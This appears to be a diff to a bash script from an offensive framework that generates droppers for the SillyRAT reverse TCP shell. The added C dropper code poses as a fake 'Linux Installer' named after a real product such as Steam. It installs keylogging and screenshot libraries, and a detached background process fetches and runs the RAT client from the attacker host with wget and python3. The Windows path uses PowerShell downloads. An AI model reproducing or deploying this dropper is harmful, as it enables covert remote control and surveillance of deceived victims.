@@ -10226,11 +10226,11 @@ if [ "$?" -ne "0" ]; then
    echo "${RedF}[ERROR] GCC compiler lib not found ($ComP)${white}"
    if [ "$ArCh" = "x64" ]; then
       echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler."
-      echo "" && sudo apt-get update && apt-get install -y mingw-w64 && echo ""
+      echo "" && sudo apt-get update -qq && apt-get install -y mingw-w64 && echo ""
       ComP="i686-w64-mingw32-gcc" # GCC library used to compile binary
    else
       echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler."
-      echo "" && sudo apt-get update && apt-get install -y mingw32 && echo ""
+      echo "" && sudo apt-get update -qq && apt-get install -y mingw32 && echo ""
       ComP="i586-mingw32msvc-gcc" # GCC library used to compile binary
    fi
 fi
@@ -10241,7 +10241,7 @@ if [ "$?" -ne "0" ]; then
    echo "${RedF}[ERROR] python3 interpreter not found${white}";sleep 2
    echo "${BlueF}[${YellowF}i${BlueF}]${white} python3 its required in Attacker/Target to exec Server/Client.${white}";
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing python3 package.";sleep 2
-   echo "" && sudo apt-get update && apt-get install -y python3 && echo ""
+   echo "" && sudo apt-get update -qq && apt-get install -y python3 && echo ""
 fi
 
 ## Check if 'venomconf' file exists
@@ -10261,37 +10261,35 @@ fi
 ## Store User Inputs (module bash variable declarations)..
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-Drop=$(zenity --title="☠ Enter DROPPER FILENAME ☠" --text "example: Curriculum\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
-SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Linux' or 'Mac' will not create dropper.exe\nWithout dropper.exe the Client.py requires to be manual exec" --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac") > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter AGENT|DROPPER FILENAME ☠" --text "example: Steam\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
+SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Cancel' or 'Mac' will not create the dropper\nWithout the dropper the Client.py requires to be manual executed\nand it will no longer auto-install SillyRAT python3 dependencies." --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac" --height 240) > /dev/null 2>&1
 if [ "$SOSP" = "Windows" ]; then rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1;fi
-
 
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="666";fi
 if [ -z "$rpath" ]; then rpath="%tmp%";fi
 if [ -z "$SOSP" ]; then SOSP="windows";fi
-if [ -z "$Drop" ]; then Drop="Python3Installer";fi
+if [ -z "$Drop" ]; then Drop="Steam";fi
 if [ "$SOSP" = "Windows" ]; then
-   targetos="Windows"
+   targetos="$SOSP"
    dropextension="exe"
    uploadpath="$rpath => (remote)"
    lolbin="Powershell (DownloadFile)"
    dropperpath="$IPATH/output/$Drop.$dropextension"
 elif [ "$SOSP" = "Linux" ]; then
-   targetos="Linux"
+   targetos="$SOSP"
    dropextension="NULL"
-   uploadpath="/tmp"
+   uploadpath="/tmp => (remote)"
    lolbin="wget (DownloadFile)"
    dropperpath="$IPATH/output/$Drop"
-else
+else # Mac or multi-platforms
    lolbin="Direct Download (url)"
    targetos="Multi-Platforms"
-   dropextension="py"
+   dropextension="NULL"
    uploadpath="NULL"
    dropperpath="NULL"
 fi
-
 
 ## Display final settings to user.
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 2
@@ -10312,6 +10310,8 @@ cd $IPATH/output
 if [ "$SOSP" = "Windows" ]; then
 
    ## BUILD DROPPER (to download/execute Client.py).
+   # TODO: target system needs to install pip3 install -r requirements.txt ???
+   # TODO: port SillyRAT project (Server/Client) to windows to test it from there (see bugs)
    echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
    cp $IPATH/templates/sillyme.c $IPATH/output/dropper.c
    sed -i "s|LhOsT|$lhost|g" dropper.c
@@ -10327,28 +10327,64 @@ if [ "$SOSP" = "Windows" ]; then
 
 elif [ "$SOSP" = "Linux" ]; then
 
-   ## BUILD DROPPER (to download/execute Client.py)
-   echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
-   echo "/*" > $Drop.c
-   echo "Author: r00t-3xp10it" >> $Drop.c
-   echo "Framework: venom v1.0.17" >> $Drop.c
-   echo "gcc -fno-stack-protector -z execstack $Drop.c -o $Drop" >> $Drop.c
-   echo "*/" >> $Drop.c
-   echo "" >> $Drop.c
-   echo "#include <stdio.h>" >> $Drop.c
-   echo "#include <stdlib.h>" >> $Drop.c
-   echo "" >> $Drop.c
-   echo "int main()" >> $Drop.c
-   echo "{" >> $Drop.c
-   echo "    system(\"cd /tmp && wget -qq http://$lhost/$Drop.py && python3 $Drop.py\");" >> $Drop.c
-   echo "    return 0;" >> $Drop.c
-   echo "}" >> $Drop.c
+      ## BUILD DROPPER (to download/execute Client.py)
+      echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
+      echo "#include<stdio.h>" > $Drop.c
+      echo "#include<stdlib.h>" >> $Drop.c
+      echo "#include<string.h>" >> $Drop.c
+      echo "#include<sys/types.h>" >> $Drop.c
+      echo "#include<sys/wait.h>" >> $Drop.c
+      echo "#include<unistd.h>" >> $Drop.c
+      echo "" >> $Drop.c
+      echo "/*" >> $Drop.c
+      echo "Author: r00t-3xp10it" >> $Drop.c
+      echo "Framework: venom v1.0.17" >> $Drop.c
+      echo "Function: Faking $Drop install to run Client.py" >> $Drop.c
+      echo "*/" >> $Drop.c
+      echo "" >> $Drop.c
+      echo "int main()" >> $Drop.c
+      echo "{" >> $Drop.c
+      echo "   /*" >> $Drop.c
+      echo "   This fork(); function allow us to spawn a new child process (in background). This way i can" >> $Drop.c
+      echo "   execute Client.py in background while continue the execution of the C program in foreground." >> $Drop.c
+      echo "   Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c" >> $Drop.c
+      echo "   */" >> $Drop.c
+      echo "   fflush(NULL);" >> $Drop.c
+      echo "   int pid = fork();" >> $Drop.c
+      echo "      if (pid > 0) {" >> $Drop.c
+      echo "         /*" >> $Drop.c
+      echo "         We are runing in parent process (child its also running)" >> $Drop.c
+      echo "         Function: Install python3 and sillyrat requirements" >> $Drop.c
+      echo "         */" >> $Drop.c
+      echo "         printf(\"\\\n$Drop v1.0.17 - Linux Installer\\\n\");" >> $Drop.c
+      echo "         printf(\"----------------------------------------\\\n\");" >> $Drop.c
+      echo "         /* Display system information onscreen to target user */" >> $Drop.c
+      echo "         sleep(1);system(\"c=\$(hostnamectl | grep 'Icon' | cut -d ':' -f2);echo \\\"Evironement:\$c\\\"\");" >> $Drop.c
+      echo "         system(\"o=\$(hostnamectl | grep 'Kernel' | cut -d ':' -f2);echo \\\"Operative system:\$o\\\"\");" >> $Drop.c
+      echo "         system(\"k=\$(hostnamectl | grep 'Machine' | cut -d ':' -f2);echo \\\"Machine ID:\$k\\\"\");" >> $Drop.c
+      echo "" >> $Drop.c
+      echo "            /* Install python3 and SillyRAT requirements */" >> $Drop.c
+      echo "            sleep(1);printf(\"Checking $Drop system requirements ..\\\n\");" >> $Drop.c
+      echo "            sleep(1);system(\"sudo apt-get update && apt-get install -y python3 && pip3 install tabulate pynput psutil pillow pyscreenshot pyinstaller\");" >> $Drop.c
+      echo "            printf(\"Done.. ALL $Drop requirements are satisfied.\\\n\");" >> $Drop.c
+      echo "" >> $Drop.c
+      echo "      }" >> $Drop.c
+      echo "      else if (pid == 0) {" >> $Drop.c
+      echo "         /*" >> $Drop.c
+      echo "         We are running in child process (as backgrond job - orphan)." >> $Drop.c
+      echo "         setsid(); allow us to detach the child (Client) from parent (dropper) process," >> $Drop.c
+      echo "         allowing us to continue running the Client.py in ram even if parent process its terminated." >> $Drop.c
+      echo "         */" >> $Drop.c
+      echo "         setsid();" >> $Drop.c
+      echo "         system(\"cd /tmp && wget -qq http://$lhost/$Drop.py && python3 $Drop.py\");" >> $Drop.c
+      echo "      } return 0;" >> $Drop.c
+      echo "}" >> $Drop.c
 
-   ## COMPILING C Program USING mingw32 OR mingw-W64
-   echo "${BlueF}[☠]${white} Compiling dropper using GCC"${Reset};sleep 2
-   gcc -fno-stack-protector -z execstack $Drop.c -o $Drop
-   chmod +x $IPATH/output/$Drop > /dev/null 2>&1
-   rm $IPATH/output/$Drop.c > /dev/nul 2>&1
+      ## COMPILING C Program USING mingw32 OR mingw-W64
+      echo "${BlueF}[☠]${white} Compiling dropper using GCC"${Reset};sleep 2
+      gcc -fno-stack-protector -z execstack $Drop.c -o $Drop
+      chmod +x $IPATH/output/$Drop > /dev/null 2>&1
+      # rm $IPATH/output/$Drop.c > /dev/nul 2>&1
 
 else
 :
@@ -10407,8 +10443,8 @@ echo "${BlueF}[☠]${white} Please Wait, cleaning old files.${white}";sleep 2
 rm $ApAcHe/$Drop.py > /dev/nul 2>&1
 rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
 rm $IPATH/output/$Drop > /dev/nul 2>&1
+# rm $IPATH/output/$Drop.c > /dev/nul 2>&1
 rm $ApAcHe/Download.html > /dev/nul 2>&1
-rm $IPATH/output/dropper.c > /dev/nul 2>&1
 rm $IPATH/output/dropper.c > /dev/nul 2>&1
 rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 rm $IPATH/output/server.py > /dev/nul 2>&1
@@ -13849,7 +13885,7 @@ cat << !
     ─────────
     DESCRIPTION        : Reverse TCP python Shell (SillyRAT)
     TARGET SYSTEMS     : Multi-Platform (Linux|Mac|Windows)
-    LOLBin             : Powershell (DownloadFile)
+    LOLBin             : Powershell|Wget (DownloadFile)
     DROPPER EXTENSION  : EXE|NULL
     AGENT EXTENSION    : PY
     DETECTION RATIO    : https://....
